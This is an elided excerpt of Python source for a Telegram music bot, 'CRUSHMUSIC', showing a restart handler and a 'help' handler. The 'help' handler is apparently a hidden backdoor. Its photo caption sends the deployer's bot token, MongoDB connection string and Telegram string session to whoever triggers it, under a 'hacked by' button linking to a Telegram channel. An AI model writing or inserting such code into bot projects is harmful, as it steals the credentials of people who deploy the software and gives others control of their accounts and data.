...
from  CRUSHMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
from  CRUSHMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
from  CRUSHMUSIC.utils.formatters import alpha_to_int, get_readable_time
...
async def restartbot(client, message: Message, _):
    ...
    try:
        db[message.chat.id] = []
        await PRASHANT.stop_stream_force(message.chat.id)
    except:
        pass
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await PRASHANT.stop_stream_force(chat_id)
        except:
            pass
...
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://envs.sh/VTQ.jpg",
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Forever_Crush)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/Forever_Crush")
                 ]
            ]
         ),
     )
